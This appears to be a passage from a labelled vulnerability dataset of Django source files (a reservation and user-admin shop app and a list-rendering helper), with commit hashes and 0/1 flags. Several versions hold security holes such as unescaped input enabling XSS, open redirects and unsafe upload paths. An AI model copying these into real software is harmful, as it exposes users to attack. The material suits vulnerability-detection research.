    if request.POST.get(""contact""):
        r.responsiblePerson = escape(str(request.POST[""contact""]))
    if (r.createdByUser == u or o.rights > 1) and not r.submitted:
        r.save()
    else:
        return HttpResponseRedirect(""/admin?error=noyb"")
    response: HttpResponseRedirect = HttpResponseRedirect(forward_url + ""?rid="" + str(r.id))
    return response


def action_delete_article(request: HttpRequest):
    """"""
    This function removes an article from the reservation and returnes
    the required resonse.
    """"""
    u: Profile = get_current_user(request)
    if ""rid"" in request.GET:
        if ""srid"" in request.GET:
            response = HttpResponseRedirect(""/admin/reservations/edit?rid="" + str(int(request.GET[""rid""])) + \
                    '&srid=' + str(int(request.GET['srid'])))
        else:
            response = HttpResponseRedirect(""/admin/reservations/edit?rid="" + str(int(request.GET[""rid""])))
    else:
        return HttpResponseRedirect(""/admin?error=Missing%20reservation%20id%20in%20request"")
    if request.GET.get(""id""):
        aid: ArticleRequested = ArticleRequested.objects.get(id=int(request.GET[""id""]))
        r: GroupReservation = GroupReservation.objects.get(id=int(request.GET[""rid""]))
        if (aid.RID.createdByUser == u or u.rights > 1) and aid.RID == r and not r.submitted:
            aid.delete()
        else:
            return HttpResponseRedirect(""/admin?error=You're%20not%20allowed%20to%20do%20this"")
    return response
/n/n/n",0
93,6e330d4d44bbfdfce9993dffea97008276771600,"/c3shop/frontpage/management/edit_user.py/n/nfrom django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest
from django.shortcuts import redirect
from django.contrib.auth.models import User
from . import page_skeleton, magic
from .form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum
from ..models import Profile, Media
from ..uitools.dataforge import get_csrf_form_element
from .magic import get_current_user
import logging


def render_edit_page(http_request: HttpRequest, action_url: str):

    user_id = None
    profile: Profile = None
    if http_request.GET.get(""user_id""):
        user_id = int(http_request.GET[""user_id""])
    if user_id is not None:
        profile = Profile.objects.get(pk=user_id)
    f = Form()
    f.action_url = action_url
    if profile:
        f.add_content(PlainText('<h3>Edit user ""' + profile.authuser.username + '""</h3>'))
        f.add_content(PlainText('<a href=""/admin/media/select?action_url=/admin/actions/change-user-avatar'
                                '&payload=' + str(user_id) + '""><img class=""button-img"" alt=""Change avatar"" '
                                'src=""/staticfiles/frontpage/change-avatar.png""/></a><br />'))
    else:
        f.add_content(PlainText('<h3>Add new user</h3>'))
    if not profile:
        f.add_content(PlainText(""username (can't be edited later on): ""))
        f.add_content(TextField(name='username'))
    if http_request.GET.get('fault') and profile:
        f.add_content(PlainText(""Unable to edit user due to: "" + str(http_request.GET['fault'])))
    elif http_request.GET.get('fault'):
        f.add_content(PlainText(""Unable to add user due to: "" + str(http_request.GET['fault'])))
    current_user: Profile = get_current_user(http_request)
    if current_user.rights > 3:
        if not profile:
            f.add_content(CheckBox(name=""active"", text=""User Active"", checked=CheckEnum.CHECKED))
        else:
            m: CheckEnum = CheckEnum.CHECKED
            if not profile.active:
                m = CheckEnum.NOT_CHECKED
            f.add_content(CheckBox(name=""active"", text=""User Active"", checked=m))
    if profile:
        f.add_content(PlainText(""Email address: ""))
        f.add_content(TextField(name='email', button_text=str(profile.authuser.email)))
        f.add_content(PlainText(""Display name: ""))
        f.add_content(TextField(name='display_name', button_text=profile.displayName))
        f.add_content(PlainText('DECT: '))
        f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0))
        f.add_content(PlainText('Number of allowed reservations: '))
        f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0))
        f.add_content(PlainText(""Rights: ""))
        f.add_content(NumberField(name=""rights"", button_text=str(profile.rights), minimum=0, maximum=4))
        f.add_content(PlainText('Notes:<br/>'))
        f.add_content(TextArea(name='notes', text=str(profile.notes)))
    else:
        f.add_content(PlainText(""Email address: ""))
        f.add_content(TextField(name='email'))
        f.add_content(PlainText(""Display name: ""))
        f.add_content(TextField(name='display_name'))
        f.add_content(PlainText('DECT: '))
        f.add_content(NumberField(name='dect', minimum=0))
        f.add_content(PlainText('Number of allowed reservations: '))
        f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0))
        f.add_content(PlainText(""Rights: ""))
        f.add_content(NumberField(name=""rights"", button_text=str(0), minimum=0, maximum=4))
        f.add_content(PlainText('Notes:<br/>'))
        f.add_content(TextArea(name='notes', placeholder=""Hier knnte ihre Werbung stehen""))
    if profile:
        f.add_content(PlainText('<br /><br />Change password (leave blank in order to not change it):'))
    else:
        f.add_content(PlainText('<br />Choose a password: '))
    f.add_content(PasswordField(name='password', required=False))
    f.add_content(PlainText('Confirm your password: '))
    f.add_content(PasswordField(name='confirm_password', required=False))
    f.add_content(PlainText(get_csrf_form_element(http_request)))
    f.add_content(SubmitButton())
    # a = page_skeleton.render_headbar(http_request, ""Edit User"")
    a = '<div class=""w3-row w3-padding-64 w3-twothird w3-container admin-popup"">'
    a += f.render_html(http_request)
    # a += page_skeleton.render_footer(http_request)
    a += ""</div>""
    return a


def check_password_conformity(pw1: str, pw2: str):
    if not (pw1 == pw2):
        return False
    if len(pw1) < 6:
        return False
    if pw1.isupper():
        return False
    if pw1.islower():
        return False
    return True


def recreate_form(reason: str):
    return redirect('/admin/users/edit?fault=' + str(reason))


def action_save_user(request: HttpRequest, default_forward_url: str = ""/admin/users""):
    """"""
    This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse
    :param request: the HttpRequest
    :param default_forward_url: The URL to forward to if nothing was specified
    :return: The crafted HttpResponse
    """"""
    forward_url = default_forward_url
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    if not request.user.is_authenticated:
        return HttpResponseForbidden()
    profile = Profile.objects.get(authuser=request.user)
    if profile.rights < 2:
        return HttpResponseForbidden()
    try:
        if request.GET.get(""user_id""):
            pid = int(request.GET[""user_id""])
            displayname = str(request.POST[""display_name""])
            dect = int(request.POST[""dect""])
            notes = str(request.POST[""notes""])
            pw1 = str(request.POST[""password""])
            pw2 = str(request.POST[""confirm_password""])
            mail = str(request.POST[""email""])
            rights = int(request.POST[""rights""])
            user: Profile = Profile.objects.get(pk=pid)
            user.displayName = displayname
            user.dect = dect
            user.notes = notes
            user.rights = rights
            user.number_of_allowed_reservations = int(request.POST[""allowed_reservations""])
            if request.POST.get(""active""):
                user.active = magic.parse_bool(request.POST[""active""])
            au: User = user.authuser
            if check_password_conformity(pw1, pw2):
                logging.log(logging.INFO, ""Set password for user: "" + user.displayName)
                au.set_password(pw1)
            else:
                logging.log(logging.INFO, ""Failed to set password for: "" + user.displayName)
            au.email = mail
            au.save()
            user.save()
        else:
            # assume new user
            username = str(request.POST[""username""])
            displayname = str(request.POST[""display_name""])
            dect = int(request.POST[""dect""])
            notes = str(request.POST[""notes""])
            pw1 = str(request.POST[""password""])
            pw2 = str(request.POST[""confirm_password""])
            mail = str(request.POST[""email""])
            rights = int(request.POST[""rights""])
            if not check_password_conformity(pw1, pw2):
                recreate_form('password mismatch')
            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)
            auth_user.save()
            user: Profile = Profile()
            user.rights = rights
            user.number_of_allowed_reservations = int(request.POST[""allowed_reservations""])
            user.displayName = displayname
            user.authuser = auth_user
            user.dect = dect
            user.notes = notes
            user.active = True
            user.save()
            pass
        pass
    except Exception as e:
        return HttpResponseBadRequest(str(e))
    return redirect(forward_url)
/n/n/n/c3shop/frontpage/management/mediatools/media_actions.py/n/nfrom datetime import date, time
from django.shortcuts import redirect
from django.http import HttpRequest, HttpResponseBadRequest
from frontpage.models import Profile, Media, MediaUpload
from frontpage.management.magic import compile_markdown, get_current_user

import logging
import ntpath
import os
import math
import PIL
from PIL import Image


PATH_TO_UPLOAD_FOLDER_ON_DISK: str = ""/usr/local/www/focweb/""
IMAGE_SCALE = 64


def action_change_user_avatar(request: HttpRequest):
    try:
        user_id = int(request.GET[""payload""])
        media_id = int(request.GET[""media_id""])
        user: Profile = Profile.objects.get(pk=int(user_id))
        u: Profile = get_current_user(request)
        if not (u == user) and u.rights < 4:
            return redirect(""/admin?error='You're not allowed to edit other users.'"")
        medium = Media.objects.get(pk=int(media_id))
        user.avatarMedia = medium
        user.save()
    except Exception as e:
        return redirect(""/admin?error="" + str(e))
    return redirect(""/admin/users"")


def handle_file(u: Profile, headline: str, category: str, text: str, file):
    m: Media = Media()
    upload_base_path: str = 'uploads/' + str(date.today().year)
    high_res_file_name = upload_base_path + '/HIGHRES_' + ntpath.basename(file.name.replace("" "", ""_""))
    low_res_file_name = upload_base_path + '/LOWRES_' + ntpath.basename(file.name.replace("" "", ""_""))
    if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path):
        os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path)
    with open(high_res_file_name, 'wb+') as destination:
        for chunk in file.chunks():
            destination.write(chunk)
    # TODO crop image
    original = Image.open(high_res_file_name)
    width, height = original.size
    diameter = math.sqrt(math.pow(width, 2) + math.pow(height, 2))
    width /= diameter
    height /= diameter
    width *= IMAGE_SCALE
    height *= IMAGE_SCALE
    cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)
    cropped.save(low_res_file_name)
    m.text = text
    m.cachedText = compile_markdown(text)
    m.category = category
    m.highResFile = ""/"" + high_res_file_name
    m.lowResFile = ""/"" + low_res_file_name
    m.headline = headline
    m.save()
    mu: MediaUpload = MediaUpload()
    mu.UID = u
    mu.MID = m
    mu.save()
    logging.info(""Uploaded file '"" + str(file.name) + ""' and cropped it. The resulting PK is "" + str(m.pk))


def action_add_single_media(request: HttpRequest):
    try:
        headline = request.POST[""headline""]
        category = request.POST[""category""]
        text = request.POST[""text""]
        file = request.FILES['file']
        user: Profile = get_current_user(request)
        handle_file(user, headline, category, text, file)
    except Exception as e:
        return redirect(""/admin/media/add?hint="" + str(e))
    return redirect(""/admin/media/add"")


def action_add_multiple_media(request: HttpRequest):
    try:
        category: str = request.POST[""category""]
        files = request.FILES.getlist('files')
        user: Profile = get_current_user(request)
        for f in files:
            handle_file(user, str(f.name), category, ""### There is no media description"", f)
    except Exception as e:
        return redirect(""/admin/media/add?hint="" + str(e))
    return redirect(""/admin/media/add"")
/n/n/n/c3shop/frontpage/management/reservation_actions.py/n/nfrom django.http import HttpRequest, HttpResponseRedirect
# from django.shortcuts import redirect
from ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation
from .magic import get_current_user
import json
import datetime

RESERVATION_CONSTRUCTION_COOKIE_KEY: str = ""org.technikradio.c3shop.frontpage"" + \
        "".reservation.cookiekey""
EMPTY_COOKY_VALUE: str = '''
{
""notes"": """",
""articles"": [],
""pickup_date"": """"
}
'''


def update_reservation_articles(postdict, rid):
    res: GroupReservation = GroupReservation.objects.get(id=rid)



def add_article_action(request: HttpRequest, default_foreward_url: str):
    forward_url: str = default_foreward_url
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    else:
        forward_url = ""/admin""
    if ""rid"" not in request.GET:
        return HttpResponseRedirect(""/admin?error=Missing%20reservation%20id%20in%20request"")
    u: Profile = get_current_user(request)
    current_reservation = GroupReservation.objects.get(id=str(request.GET[""rid""]))
    if current_reservation.createdByUser != u and u.rights < 2:
        return HttpResponseRedirect(""/admin?error=noyb"")
    if current_reservation.submitted == True:
        return HttpResponseRedirect(""/admin?error=Already%20submitted"")
    # Test for multiple or single article
    if ""article_id"" in request.POST:
        # Actual adding of article
        aid: int = int(request.GET.get(""article_id""))
        quantity: int = int(request.POST[""quantity""])
        notes: str = request.POST[""notes""]
        ar = ArticleRequested()
        ar.AID = Article.objects.get(id=aid)
        ar.RID = current_reservation
        if ""srid"" in request.GET:
            ar.SRID = SubReservation.objects.get(id=int(request.GET[""srid""]))
        ar.amount = quantity
        ar.notes = notes
        ar.save()
    # Actual adding of multiple articles
    else:
        if ""group_id"" not in request.GET:
            return HttpResponseRedirect(""/admin?error=missing%20group%20id"")
        g: ArticleGroup = ArticleGroup.objects.get(id=int(request.GET[""group_id""]))
        for art in Article.objects.all().filter(group=g):
            if str(""quantity_"" + str(art.id)) not in request.POST or str(""notes_"" + str(art.id)) not in request.POST:
                return HttpResponseRedirect(""/admin?error=Missing%20article%20data%20in%20request"")
            amount = int(request.POST[""quantity_"" + str(art.id)])
            if amount > 0:
                ar = ArticleRequested()
                ar.AID = art
                ar.RID = current_reservation
                ar.amount = amount
                if ""srid"" in request.GET:
                    ar.SRID = SubReservation.objects.get(id=int(request.GET[""srid""]))
                ar.notes = str(request.POST[str(""notes_"" + str(art.id))])
                ar.save()
    if ""srid"" in request.GET:
        response = HttpResponseRedirect(forward_url + ""?rid="" + str(current_reservation.id) + ""&srid="" + request.GET[""srid""])
    else:
        response = HttpResponseRedirect(forward_url + ""?rid="" + str(current_reservation.id))
    return response


def write_db_reservation_action(request: HttpRequest):
    """"""
    This function is used to submit the reservation
    """"""
    u: Profile = get_current_user(request)
    forward_url = ""/admin?success""
    if u.rights > 0:
        forward_url = ""/admin/reservations""
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    if ""payload"" not in request.GET:
        return HttpResponseRedirect(""/admin?error=No%20id%20provided"")
    current_reservation = GroupReservation.objects.get(id=int(request.GET[""payload""]))
    if current_reservation.createdByUser != u and u. rights < 2:
        return HttpResponseRedirect(""/admin?error=noyb"")
    current_reservation.submitted = True
    current_reservation.save()
    res: HttpResponseRedirect = HttpResponseRedirect(forward_url)
    return res


def manipulate_reservation_action(request: HttpRequest, default_foreward_url: str):
    """"""
    This function is used to alter the reservation beeing build inside
    a cookie. This function automatically crafts the required response.
    """"""
    js_string: str = """"
    r: GroupReservation = None
    u: Profile = get_current_user(request)
    forward_url: str = default_foreward_url
    if request.GET.get(""redirect""):
        forward_url = request.GET[""redirect""]
    if ""srid"" in request.GET:
        if not request.GET.get(""rid""):
            return HttpResponseRedirect(""/admin?error=missing%20primary%20reservation%20id"")
        srid: int = int(request.GET[""srid""])
        sr: SubReservation = None
        if srid == 0:
            sr = SubReservation()
        else:
            sr = SubReservation.objects.get(id=srid)
        if request.POST.get(""notes""):
            sr.notes = request.POST[""notes""]
        else:
            sr.notes = "" ""
        sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[""rid""]))
        sr.save()
        print(request.POST)
        print(sr.notes)
        return HttpResponseRedirect(""/admin/reservations/edit?rid="" + str(int(request.GET[""rid""])) + ""&srid="" + str(sr.id))
    if ""rid"" in request.GET:
        # update reservation
        r = GroupReservation.objects.get(id=int(request.GET[""rid""]))
    elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count():
        r = GroupReservation()
        r.createdByUser = u
        r.ready = False
        r.open = True
        r.pickupDate = datetime.datetime.now()
    else:
        return HttpResponseRedirect(""/admin?error=Too%20Many%20reservations"")
    if request.POST.get(""notes""):
        r.notes = request.POST[""notes""]
    if request.POST.get(""contact""):
        r.responsiblePerson = str(request.POST[""contact""])
    if (r.createdByUser == u or o.rights > 1) and not r.submitted:
        r.save()
    else:
        return HttpResponseRedirect(""/admin?error=noyb"")
    response: HttpResponseRedirect = HttpResponseRedirect(forward_url + ""?rid="" + str(r.id))
    return response


def action_delete_article(request: HttpRequest):
    """"""
    This function removes an article from the reservation and returnes
    the required resonse.
    """"""
    u: Profile = get_current_user(request)
    if ""rid"" in request.GET:
        if ""srid"" in request.GET:
            response = HttpResponseRedirect(""/admin/reservations/edit?rid="" + str(int(request.GET[""rid""])) + \
                    '&srid=' + str(int(request.GET['srid'])))
        else:
            response = HttpResponseRedirect(""/admin/reservations/edit?rid="" + str(int(request.GET[""rid""])))
    else:
        return HttpResponseRedirect(""/admin?error=Missing%20reservation%20id%20in%20request"")
    if request.GET.get(""id""):
        aid: ArticleRequested = ArticleRequested.objects.get(id=int(request.GET[""id""]))
        r: GroupReservation = GroupReservation.objects.get(id=int(request.GET[""rid""]))
        if (aid.RID.createdByUser == u or u.rights > 1) and aid.RID == r and not r.submitted:
            aid.delete()
        else:
            return HttpResponseRedirect(""/admin?error=You're%20not%20allowed%20to%20do%20this"")
    return response
/n/n/n",1
94,44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3,"smart_lists/helpers.py/n/nimport datetime

from django.core.exceptions import FieldDoesNotExist
from django.db.models import BooleanField, ForeignKey
from django.utils.formats import localize
from django.utils.html import format_html, escape
from django.utils.http import urlencode
from django.utils.translation import gettext_lazy as _
from typing import List

from smart_lists.exceptions import SmartListException
from smart_lists.filters import SmartListFilter


class TitleFromModelFieldMixin(object):
    def get_title(self):
        if self.label:
            return self.label
        elif self.model_field:
            return self.model_field.verbose_name.title()
        elif self.field_name == '__str__':
            return self.model._meta.verbose_name.title()
        try:
            field = getattr(self.model, self.field_name)
        except AttributeError as e:
            return self.field_name.title()
        if callable(field) and getattr(field, 'short_description', False):
            return field.short_description
        return self.field_name.replace(""_"", "" "").title()


class QueryParamsMixin(object):
    def get_url_with_query_params(self, new_query_dict):
        query = dict(self.query_params).copy()
        for key, value in query.items():
            if type(value) == list:
                query[key] = value[0]
        query.update(new_query_dict)
        for key, value in query.copy().items():
            if value is None:
                del query[key]
        return '?{}'.format(urlencode(query))


class SmartListField(object):
    def __init__(self, smart_list_item, column, object):
        self.smart_list_item = smart_list_item
        self.column = column
        self.object = object

    def get_value(self):
        field = getattr(self.object, self.column.field_name) if self.column.field_name else None
        if self.column.render_function:
            template = self.column.render_function(self.object)
            if not self.is_template_instance(template):
                raise SmartListException(
                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(
                        self.column.render_function.__name__,
                        type(template),
                    )
                )
            value = template.render()
        elif type(self.object) == dict:
            value = self.object.get(self.column.field_name)
        elif callable(field):
            value = field() if getattr(field, 'do_not_call_in_templates', False) else field
        else:
            display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)
            value = display_function() if display_function else field

        return value

    def is_template_instance(self, obj):
        """"""Check if given object is object of Template.""""""
        from django.template import Template as Template
        from django.template.backends.django import Template as DjangoTemplate
        from django.template.backends.jinja2 import Template as Jinja2Template

        return (
            isinstance(obj, Template)
            or isinstance(obj, DjangoTemplate)
            or isinstance(obj, Jinja2Template)
        )


    def format(self, value):
        if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):
            return localize(value)
        return value

    def render(self):
        return format_html(
            '<td>{}</td>', self.format(self.get_value())
        )

    def render_link(self):
        if not hasattr(self.object, 'get_absolute_url'):
            raise SmartListException(""Please make sure your model {} implements get_absolute_url()"".format(type(self.object)))
        return format_html(
            '<td><a href=""{}"">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value())
        )


class SmartListItem(object):
    def __init__(self, smart_list, object):
        self.smart_list = smart_list
        self.object = object

    def fields(self):
        return [
            SmartListField(self, column, self.object) for column in self.smart_list.columns
        ]


class SmartOrder(QueryParamsMixin, object):
    def __init__(self, query_params, column_id, ordering_query_param):
        self.query_params = query_params
        self.column_id = column_id
        self.ordering_query_param = ordering_query_param
        self.query_order = query_params.get(ordering_query_param)
        self.current_columns = [int(col) for col in self.query_order.replace(""-"", """").split(""."")] if self.query_order else []
        self.current_columns_length = len(self.current_columns)

    @property
    def priority(self):
        if self.is_ordered():
            return self.current_columns.index(self.column_id) + 1

    def is_ordered(self):
        return self.column_id in self.current_columns

    def is_reverse(self):
        for column in self.query_order.split('.'):
            c = column.replace(""-"", """")
            if int(c) == self.column_id:
                if column.startswith(""-""):
                    return True
        return False

    def get_add_sort_by(self):
        if not self.is_ordered():
            if self.query_order:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order)
                })
            else:
                return self.get_url_with_query_params({
                    self.ordering_query_param: self.column_id
                })
        elif self.current_columns_length > 1:
            new_query = []
            for column in self.query_order.split('.'):
                c = column.replace(""-"", """")
                if not int(c) == self.column_id:
                    new_query.append(column)
            if not self.is_reverse() and self.current_columns[0] == self.column_id:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '-{}.{}'.format(self.column_id, ""."".join(new_query))
                })
            else:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '{}.{}'.format(self.column_id, ""."".join(new_query))
                })

        else:
            return self.get_reverse_sort_by()

    def get_remove_sort_by(self):
        new_query = []
        for column in self.query_order.split('.'):
            c = column.replace(""-"", """")
            if not int(c) == self.column_id:
                new_query.append(column)
        return self.get_url_with_query_params({
            self.ordering_query_param: ""."".join(new_query)
        })

    def get_reverse_sort_by(self):
        new_query = []
        for column in self.query_order.split('.'):
            c = column.replace(""-"", """")
            if int(c) == self.column_id:
                if column.startswith(""-""):
                    new_query.append(c)
                else:
                    new_query.append('-{}'.format(c))
            else:
                new_query.append(column)

        return self.get_url_with_query_params({
            self.ordering_query_param: ""."".join(new_query)
        })


class SmartColumn(TitleFromModelFieldMixin, object):
    def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None):
        self.model = model
        self.field_name = field
        self.label = label
        self.render_function = render_function
        self.order_field = None
        self.order = None

        # If there is no field_name that means it is not bound to any model field
        if not self.field_name:
            return

        if self.field_name.startswith(""_"") and self.field_name != ""__str__"":
            raise SmartListException(""Cannot use underscore(_) variables/functions in smart lists"")
        try:
            self.model_field = self.model._meta.get_field(self.field_name)
            self.order_field = self.field_name
        except FieldDoesNotExist:
            self.model_field = None
            try:
                field = getattr(self.model, self.field_name)
                if callable(field) and getattr(field, 'admin_order_field', False):
                    self.order_field = getattr(field, 'admin_order_field')
                if callable(field) and getattr(field, 'alters_data', False):
                    raise SmartListException(""Cannot use a function that alters data in smart list"")
            except AttributeError:
                self.order_field = self.field_name
                pass  # This is most likely a .values() query set

        if self.order_field:
            self.order = SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param)


class SmartFilterValue(QueryParamsMixin, object):
    def __init__(self, field_name, label, value, query_params):
        self.field_name = field_name
        self.label = label
        self.value = value
        self.query_params = query_params

    def get_title(self):
        return self.label

    def get_url(self):
        return self.get_url_with_query_params({
            self.field_name: self.value
        })

    def is_active(self):
        if self.field_name in self.query_params:
            selected_value = self.query_params[self.field_name]
            if type(selected_value) == list:
                selected_value = selected_value[0]
            if selected_value == self.value:
                return True
        elif self.value is None:
            return True
        return False


class SmartFilter(TitleFromModelFieldMixin, object):
    def __init__(self, model, field, query_params, object_list):
        self.model = model

        # self.model_field = None
        if isinstance(field, SmartListFilter):
            self.field_name = field.parameter_name
            self.model_field = field
        else:
            self.field_name = field
            self.model_field = self.model._meta.get_field(self.field_name)
        self.query_params = query_params
        self.object_list = object_list

    def get_title(self):
        if isinstance(self.model_field, SmartListFilter):
            return self.model_field.title
        return super(SmartFilter, self).get_title()

    def get_values(self):
        values = []
        if isinstance(self.model_field, SmartListFilter):
            values = [
                SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups()
            ]
        elif self.model_field.choices:
            values = [
                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices
            ]
        elif type(self.model_field) == BooleanField:
            values = [
                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in (
                    (1, _('Yes')),
                    (0, _('No'))
                )
            ]
        elif issubclass(type(self.model_field), ForeignKey):
            pks = self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True)
            remote_field = self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field
            qs = remote_field.model.objects.filter(pk__in=pks)
            values = [
                SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs
            ]

        return [SmartFilterValue(self.field_name, _(""All""), None, self.query_params)] + values


class SmartList(object):
    def __init__(self, object_list, query_params=None, list_display=None, list_filter=None,
                 list_search=None, search_query_param=None, ordering_query_param=None):
        self.object_list = object_list
        self.model = object_list.model
        self.query_params = query_params or {}
        self.list_display = list_display or []
        self.list_filter = list_filter or []
        self.list_search = list_search or []
        self.search_query_value = self.query_params.get(search_query_param, '')
        self.search_query_param = search_query_param
        self.ordering_query_value = self.query_params.get(ordering_query_param, '')
        self.ordering_query_param = ordering_query_param

        self.columns = self.get_columns()

        self.filters = [
            SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1)
        ] if self.list_filter else []

    def get_columns(self):  # type: () -> List[SmartColumn]
        """"""
        Transform list_display into list of SmartColumns
        In list_display we expect:
         1. name of the field (string)
         or
         2. two element iterable in which:
            - first element is name of the field (string) or callable
              which returns html
            - label for the column (string)
        """"""

        if not self.list_display:
            return [SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)]

        columns = []
        for index, field in enumerate(self.list_display, start=1):
            kwargs = {
                'model': self.model,
                'column_id': index,
                'query_params': self.query_params,
                'ordering_query_param': self.ordering_query_param,
            }

            try:
                field, label = field
            except (TypeError, ValueError):
                kwargs['field'] = field
            else:
                if callable(field):
                    kwargs['field'], kwargs['render_function'], kwargs['label'] = None, field, label
                else:
                    kwargs['field'], kwargs['label'] = field, label
            columns.append(SmartColumn(**kwargs))
        return columns

    @property
    def items(self):
        return [
            SmartListItem(self, obj) for obj in self.object_list
        ]
/n/n/n",0
95,44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3,"/smart_lists/helpers.py/n/nimport datetime

from django.core.exceptions import FieldDoesNotExist
from django.db.models import BooleanField, ForeignKey
from django.utils.formats import localize
from django.utils.html import format_html, escape
from django.utils.http import urlencode
from django.utils.translation import gettext_lazy as _
from typing import List

from smart_lists.exceptions import SmartListException
from smart_lists.filters import SmartListFilter


class TitleFromModelFieldMixin(object):
    def get_title(self):
        if self.label:
            return self.label
        elif self.model_field:
            return self.model_field.verbose_name.title()
        elif self.field_name == '__str__':
            return self.model._meta.verbose_name.title()
        try:
            field = getattr(self.model, self.field_name)
        except AttributeError as e:
            return self.field_name.title()
        if callable(field) and getattr(field, 'short_description', False):
            return field.short_description
        return self.field_name.replace(""_"", "" "").title()


class QueryParamsMixin(object):
    def get_url_with_query_params(self, new_query_dict):
        query = dict(self.query_params).copy()
        for key, value in query.items():
            if type(value) == list:
                query[key] = value[0]
        query.update(new_query_dict)
        for key, value in query.copy().items():
            if value is None:
                del query[key]
        return '?{}'.format(urlencode(query))


class SmartListField(object):
    def __init__(self, smart_list_item, column, object):
        self.smart_list_item = smart_list_item
        self.column = column
        self.object = object

    def get_value(self):
        if self.column.render_function:
            # We don't want to escape our html
            return self.column.render_function(self.object)

        field = getattr(self.object, self.column.field_name) if self.column.field_name else None
        if type(self.object) == dict:
            value = self.object.get(self.column.field_name)
        elif callable(field):
            value = field() if getattr(field, 'do_not_call_in_templates', False) else field
        else:
            display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)
            value = display_function() if display_function else field

        return escape(value)

    def format(self, value):
        if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):
            return localize(value)
        return value

    def render(self):
        return format_html(
            '<td>{}</td>', self.format(self.get_value())
        )

    def render_link(self):
        if not hasattr(self.object, 'get_absolute_url'):
            raise SmartListException(""Please make sure your model {} implements get_absolute_url()"".format(type(self.object)))
        return format_html(
            '<td><a href=""{}"">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value())
        )


class SmartListItem(object):
    def __init__(self, smart_list, object):
        self.smart_list = smart_list
        self.object = object

    def fields(self):
        return [
            SmartListField(self, column, self.object) for column in self.smart_list.columns
        ]


class SmartOrder(QueryParamsMixin, object):
    def __init__(self, query_params, column_id, ordering_query_param):
        self.query_params = query_params
        self.column_id = column_id
        self.ordering_query_param = ordering_query_param
        self.query_order = query_params.get(ordering_query_param)
        self.current_columns = [int(col) for col in self.query_order.replace(""-"", """").split(""."")] if self.query_order else []
        self.current_columns_length = len(self.current_columns)

    @property
    def priority(self):
        if self.is_ordered():
            return self.current_columns.index(self.column_id) + 1

    def is_ordered(self):
        return self.column_id in self.current_columns

    def is_reverse(self):
        for column in self.query_order.split('.'):
            c = column.replace(""-"", """")
            if int(c) == self.column_id:
                if column.startswith(""-""):
                    return True
        return False

    def get_add_sort_by(self):
        if not self.is_ordered():
            if self.query_order:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order)
                })
            else:
                return self.get_url_with_query_params({
                    self.ordering_query_param: self.column_id
                })
        elif self.current_columns_length > 1:
            new_query = []
            for column in self.query_order.split('.'):
                c = column.replace(""-"", """")
                if not int(c) == self.column_id:
                    new_query.append(column)
            if not self.is_reverse() and self.current_columns[0] == self.column_id:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '-{}.{}'.format(self.column_id, ""."".join(new_query))
                })
            else:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '{}.{}'.format(self.column_id, ""."".join(new_query))
                })

        else:
            return self.get_reverse_sort_by()

    def get_remove_sort_by(self):
        new_query = []
        for column in self.query_order.split('.'):
            c = column.replace(""-"", """")
            if not int(c) == self.column_id:
                new_query.append(column)
        return self.get_url_with_query_params({
            self.ordering_query_param: ""."".join(new_query)
        })

    def get_reverse_sort_by(self):
        new_query = []
        for column in self.query_order.split('.'):
            c = column.replace(""-"", """")
            if int(c) == self.column_id:
                if column.startswith(""-""):
                    new_query.append(c)
                else:
                    new_query.append('-{}'.format(c))
            else:
                new_query.append(column)

        return self.get_url_with_query_params({
            self.ordering_query_param: ""."".join(new_query)
        })


class SmartColumn(TitleFromModelFieldMixin, object):
    def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None):
        self.model = model
        self.field_name = field
        self.label = label
        self.render_function = render_function
        self.order_field = None
        self.order = None

        # If there is no field_name that means it is not bound to any model field
        if not self.field_name:
            return

        if self.field_name.startswith(""_"") and self.field_name != ""__str__"":
            raise SmartListException(""Cannot use underscore(_) variables/functions in smart lists"")
        try:
            self.model_field = self.model._meta.get_field(self.field_name)
            self.order_field = self.field_name
